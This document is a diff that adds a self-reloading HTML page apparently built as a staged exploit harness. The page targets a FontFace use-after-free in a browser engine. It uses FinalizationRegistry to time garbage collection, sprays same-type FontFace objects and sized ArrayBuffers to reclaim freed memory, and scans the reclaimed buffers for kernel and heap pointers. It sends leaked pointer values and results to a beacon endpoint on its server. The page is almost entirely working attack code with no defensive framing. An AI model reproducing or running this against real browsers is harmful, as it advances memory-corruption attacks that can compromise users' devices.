@@ -1,0 +1,441 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1211 FontFace FinalizationRegistry UAF</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:50vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1211 — FONTFACE FINALIZATIONREGISTRY + SAMETYPE RECLAIM</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">...</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var c=FD.textContent;FD.textContent=(c==='no findings yet'?'':c+'\n')+t;}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1211-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1211: FinalizationRegistry-guided FontFace UAF with same-type reclaim
+
+   KEY INSIGHT: Previous probes used WeakRef to detect GC of FontFace
+   wrapper objects. But FinalizationRegistry fires a CALLBACK when the
+   registered object is collected. We use this to:
+   1. Create FontFace, add to document.fonts, get .then getter reference
+   2. Register FontFace in FinalizationRegistry
+   3. Delete from fonts set, null all JS refs → GC collects wrapper
+   4. FinalizationRegistry callback fires → we know C++ side may be stale
+   5. Immediately spray same-size FontFace objects to reclaim the zone
+   6. Access the stale .then getter → reads through reclaimed memory
+
+   IsoHeap consideration: FontFace C++ objects are in the FontFace
+   IsoHeap zone. New FontFace objects go to the SAME zone. This is
+   same-type reclaim that IsoHeap does NOT block.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var STAGES=['detect','thenGetter','finregTiming','sameTypeReclaim','ptrScan','massReclaim'];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1211_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1211_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+STAGES.length+' — '+(STAGES[stage]||'DONE'));
+
+function done(rep){
+  results.push({stage:stage,name:STAGES[stage],result:rep});
+  try{localStorage.setItem('p1211_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','s'+stage+'|'+rep.slice(0,700));
+  addFind('S'+stage+' '+STAGES[stage]+': '+rep.slice(0,200));
+  setStatus(rep.slice(0,80));
+  log('=== S'+stage+' -> '+rep+' ===','ok');
+  setTimeout(function(){location.reload();},1500);
+}
+
+if(stage>=STAGES.length){
+  setStatus('ALL STAGES COMPLETE');
+  var summary=JSON.stringify(results);
+  B('ALL-DONE',summary.slice(0,800));
+  log('ALL DONE','ok');log(summary,'info');
+  try{localStorage.removeItem('p1211_stage');localStorage.removeItem('p1211_res');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1211_stage',''+(stage+1));}catch(e){}
+setPhase(STAGES[stage]);
+
+/* ─── STAGE 0: detect ─── */
+if(stage===0)(function(){
+  log('S0: detect features','info');
+  var c={};
+  c.FontFace=typeof FontFace==='function';
+  c.fonts=!!document.fonts;
+  c.FinalizationRegistry=typeof FinalizationRegistry==='function';
+  c.WeakRef=typeof WeakRef==='function';
+  c.BigUint64Array=typeof BigUint64Array==='function';
+  c.gc=typeof gc==='function';
+
+  if(c.FontFace){
+    try{
+      var f=new FontFace('det','local(serif)');
+      c.thenGetter=(typeof f.loaded==='object')&&(typeof f.loaded.then==='function');
+      c.status=f.status;
+      var desc=Object.getOwnPropertyDescriptor(FontFace.prototype,'loaded');
+      c.loadedIsGetter=!!(desc&&desc.get);
+    }catch(e){c.err=e.message;}
+  }
+  done('DETECT|'+JSON.stringify(c));
+})();
+
+/* ─── STAGE 1: .then getter baseline ─── */
+else if(stage===1)(function(){
+  log('S1: then getter baseline — measure normal behavior','info');
+  var face=new FontFace('thentest','local(sans-serif)');
+  document.fonts.add(face);
+
+  var loadedPromise=face.loaded;
+  var thenResult=null;
+
+  face.load().then(function(){
+    log('face loaded','ok');
+    return loadedPromise;
+  }).then(function(f){
+    thenResult='resolved';
+    log('.loaded resolved with: '+typeof f,'ok');
+
+    document.fonts.delete(face);
+    log('face deleted from set','warn');
+
+    try{
+      var status2=face.status;
+      var loaded2=face.loaded;
+      log('post-delete status: '+status2,'info');
+      log('post-delete .loaded type: '+typeof loaded2,'info');
+      done('THEN-BASELINE|resolved|postDel-status='+status2+'|loaded-type='+typeof loaded2);
+    }catch(e){
+      done('THEN-BASELINE|resolved|postDel-THREW='+e.message);
+    }
+  }).catch(function(e){
+    done('THEN-BASELINE|rejected='+e.message);
+  });
+
+  setTimeout(function(){if(!thenResult)done('THEN-BASELINE|TIMEOUT');},8000);
+})();
+
+/* ─── STAGE 2: FinalizationRegistry timing ─── */
+else if(stage===2)(function(){
+  log('S2: FinalizationRegistry GC timing','info');
+
+  if(typeof FinalizationRegistry!=='function'){
+    done('FINREG-TIMING|NO-FinalizationRegistry');
+    return;
+  }
+
+  var collected=0;
+  var collectTimes=[];
+  var fr=new FinalizationRegistry(function(id){
+    collected++;
+    collectTimes.push(Date.now()-T0);
+    log('FinReg callback #'+collected+' id='+id+' at '+(Date.now()-T0)+'ms','hit');
+    B('FINREG','collected='+collected+'|id='+id);
+  });
+
+  var N=10;
+  for(var i=0;i<N;i++){
+    var f=new FontFace('finreg_'+i,'local(sans-serif)');
+    document.fonts.add(f);
+    fr.register(f,'face_'+i);
+    document.fonts.delete(f);
+  }
+
+  log('created+deleted '+N+' faces, forcing GC pressure...','warn');
+
+  function pressureGC(){
+    var arr=[];
+    for(var j=0;j<2000;j++){arr.push(new ArrayBuffer(1024));}
+    arr=null;
+  }
+
+  var gcRounds=0;
+  function gcLoop(){
+    if(gcRounds>=20||collected>=N){
+      done('FINREG-TIMING|created='+N+'|collected='+collected+'|times=['+collectTimes.join(',')+']|rounds='+gcRounds);
+      return;
+    }
+    pressureGC();
+    gcRounds++;
+    setCounters('GC round '+gcRounds+'/20 collected='+collected+'/'+N);
+    setTimeout(gcLoop,200);
+  }
+  gcLoop();
+})();
+
+/* ─── STAGE 3: same-type reclaim ─── */
+else if(stage===3)(function(){
+  log('S3: same-type reclaim — replace freed FontFace with new FontFace','info');
+
+  if(typeof FinalizationRegistry!=='function'){
+    done('SAMETYPE-RECLAIM|NO-FinalizationRegistry');
+    return;
+  }
+
+  var collected=false;
+  var staleLoadedRef=null;
+  var fr=new FinalizationRegistry(function(id){
+    if(collected)return;
+    collected=true;
+    log('TARGET COLLECTED — spraying same-type replacements','hit');
+    B('COLLECTED','spraying');
+
+    var replacements=[];
+    for(var k=0;k<50;k++){
+      var r=new FontFace('reclaim_'+k,'local(monospace)');
+      document.fonts.add(r);
+      replacements.push(r);
+    }
+
+    log('sprayed 50 FontFace objects','warn');
+
+    setTimeout(function(){
+      try{
+        var result=staleLoadedRef;
+        if(result&&typeof result.then==='function'){
+          log('stale .loaded still has .then — accessing...','warn');
+          result.then(function(v){
+            log('stale then resolved: '+typeof v+' '+v,'hit');
+            B('STALE-RESOLVED',typeof v+' '+String(v).slice(0,200));
+            done('SAMETYPE-RECLAIM|STALE-RESOLVED|type='+typeof v+'|val='+String(v).slice(0,100));
+          }).catch(function(e){
+            done('SAMETYPE-RECLAIM|STALE-REJECTED|err='+e.message);
+          });
+        }else{
+          done('SAMETYPE-RECLAIM|no-stale-ref');
+        }
+      }catch(e){
+        done('SAMETYPE-RECLAIM|ACCESS-THREW|err='+e.message);
+      }
+    },100);
+  });
+
+  var target=new FontFace('target_s3','local(sans-serif)');
+  document.fonts.add(target);
+  staleLoadedRef=target.loaded;
+  fr.register(target,'target');
+
+  target.load().then(function(){
+    log('target loaded — now deleting and nulling','warn');
+    document.fonts.delete(target);
+    target=null;
+
+    function pressure(){
+      var a=[];for(var j=0;j<5000;j++)a.push(new ArrayBuffer(256));a=null;
+    }
+    var rounds=0;
+    function gcLoop(){
+      if(collected||rounds>=30){
+        if(!collected)done('SAMETYPE-RECLAIM|NOT-COLLECTED-IN-30-ROUNDS');
+        return;
+      }
+      pressure();
+      rounds++;
+      setCounters('GC round '+rounds+'/30 collected='+collected);
+      setTimeout(gcLoop,150);
+    }
+    gcLoop();
+  }).catch(function(e){
+    done('SAMETYPE-RECLAIM|LOAD-REJECTED|err='+e.message);
+  });
+
+  setTimeout(function(){if(!collected)done('SAMETYPE-RECLAIM|TIMEOUT');},20000);
+})();
+
+/* ─── STAGE 4: Pointer scan through reclaimed memory ─── */
+else if(stage===4)(function(){
+  log('S4: pointer scan — BigUint64Array read through AB reclaim','info');
+
+  if(typeof BigUint64Array!=='function'){done('PTR-SCAN|NO-BigUint64Array');return;}
+  if(typeof FinalizationRegistry!=='function'){done('PTR-SCAN|NO-FinalizationRegistry');return;}
+
+  var collected=false;
+  var sprays=[];
+  var ptrFinds=[];
+
+  var fr=new FinalizationRegistry(function(){
+    if(collected)return;
+    collected=true;
+    log('face collected — spraying 192B ArrayBuffers','hit');
+
+    for(var k=0;k<100;k++){
+      var ab=new ArrayBuffer(192);
+      var bv=new BigUint64Array(ab);
+      sprays.push({ab:ab,bv:bv});
+    }
+
+    setTimeout(function(){
+      for(var s=0;s<sprays.length;s++){
+        var bv=sprays[s].bv;
+        for(var q=0;q<bv.length;q++){
+          var v=bv[q];
+          if(v!==BigInt(0)){
+            var hex='0x'+v.toString(16).padStart(16,'0');
+            ptrFinds.push('s'+s+'['+q+']='+hex);
+            var hi=Number(v>>BigInt(32));
+            if(hi>=0xFFFF8000){
+              log('KERNEL PTR: spray['+s+']['+q+'] = '+hex,'hit');
+              B('KPTR',hex);
+            }else if(hi>0&&hi<0x7FFF){
+              log('HEAP PTR: spray['+s+']['+q+'] = '+hex,'warn');
+              B('HPTR',hex);
+            }
+          }
+        }
+      }
+      done('PTR-SCAN|collected=true|ptrs='+ptrFinds.length+'|finds=['+ptrFinds.slice(0,20).join(',')+']');
+    },200);
+  });
+
+  var N=20;
+  for(var i=0;i<N;i++){
+    var f=new FontFace('ptrscan_'+i,'local(sans-serif)');
+    document.fonts.add(f);
+    if(i===0)fr.register(f,'target');
+    document.fonts.delete(f);
+  }
+
+  function pressure(){var a=[];for(var j=0;j<5000;j++)a.push(new ArrayBuffer(192));a=null;}
+  var rounds=0;
+  function gcLoop(){
+    if(collected||rounds>=40){
+      if(!collected)done('PTR-SCAN|NOT-COLLECTED');
+      return;
+    }
+    pressure();rounds++;
+    setCounters('GC round '+rounds+'/40 collected='+collected);
+    setTimeout(gcLoop,150);
+  }
+  gcLoop();
+  setTimeout(function(){if(!collected)done('PTR-SCAN|TIMEOUT');},25000);
+})();
+
+/* ─── STAGE 5: Mass reclaim with varied sizes ─── */
+else if(stage===5)(function(){
+  log('S5: mass reclaim with multiple size classes','info');
+
+  var SIZES=[48,96,128,192,256,384,512,768];
+  var collected=0;
+  var sprays={};
+  var ptrFinds=[];
+
+  var fr=new FinalizationRegistry(function(id){
+    collected++;
+    log('collected: '+id+' total='+collected,'warn');
+  });
+
+  var N=50;
+  for(var i=0;i<N;i++){
+    var f=new FontFace('mass_'+i,'local(sans-serif)');
+    document.fonts.add(f);
+    fr.register(f,'mass_'+i);
+    document.fonts.delete(f);
+  }
+
+  function pressure(){var a=[];for(var j=0;j<10000;j++)a.push(new ArrayBuffer(192));a=null;}
+  var rounds=0;
+
+  function sprayAndScan(){
+    log('spraying '+SIZES.length+' size classes...','info');
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      sprays[sz]=[];
+      for(var k=0;k<50;k++){
+        var ab=new ArrayBuffer(sz);
+        if(typeof BigUint64Array==='function'&&sz>=8){
+          sprays[sz].push({ab:ab,bv:new BigUint64Array(ab)});
+        }else{
+          sprays[sz].push({ab:ab,bv:null});
+        }
+      }
+    }
+
+    setTimeout(function(){
+      for(var sz in sprays){
+        var arr=sprays[sz];
+        for(var s=0;s<arr.length;s++){
+          if(!arr[s].bv)continue;
+          var bv=arr[s].bv;
+          for(var q=0;q<bv.length;q++){
+            var v=bv[q];
+            if(v!==BigInt(0)){
+              var hex='0x'+v.toString(16).padStart(16,'0');
+              ptrFinds.push('sz'+sz+'s'+s+'['+q+']='+hex);
+              var hi=Number(v>>BigInt(32));
+              if(hi>=0xFFFF8000){
+                log('KERNEL PTR sz='+sz+': ['+s+']['+q+'] = '+hex,'hit');
+                B('KPTR','sz='+sz+'|'+hex);
+              }else if(v>BigInt(0x1000)){
+                log('nonzero sz='+sz+': ['+s+']['+q+'] = '+hex,'warn');
+              }
+            }
+          }
+        }
+      }
+      done('MASS-RECLAIM|collected='+collected+'/'+N+'|ptrs='+ptrFinds.length+'|finds=['+ptrFinds.slice(0,20).join(',')+']');
+    },500);
+  }
+
+  function gcLoop(){
+    if(rounds>=30){
+      sprayAndScan();
+      return;
+    }
+    pressure();rounds++;
+    setCounters('GC round '+rounds+'/30 collected='+collected+'/'+N);
+    setTimeout(gcLoop,200);
+  }
+  gcLoop();
+  setTimeout(function(){if(rounds<30)sprayAndScan();},25000);
+})();
+
+} /* end else */
+
+/* ─── Reload poller ─── */
+var _rl='',_rp=0;
+function checkReload(){
+  if(_rp>300)return;_rp++;
+  var x=new XMLHttpRequest();
+  x.open('GET','/reload.txt?_='+Date.now(),true);
+  x.timeout=3000;
+  x.onload=function(){
+    var t=(x.responseText||'').trim();
+    if(_rl&&t!==_rl){log('RELOAD signal','warn');setTimeout(function(){location.reload();},500);return;}
+    _rl=t;
+  };
+  try{x.send();}catch(e){}
+  setTimeout(checkReload,3000);
+}
+setTimeout(checkReload,2000);
+</script>
+</body></html>
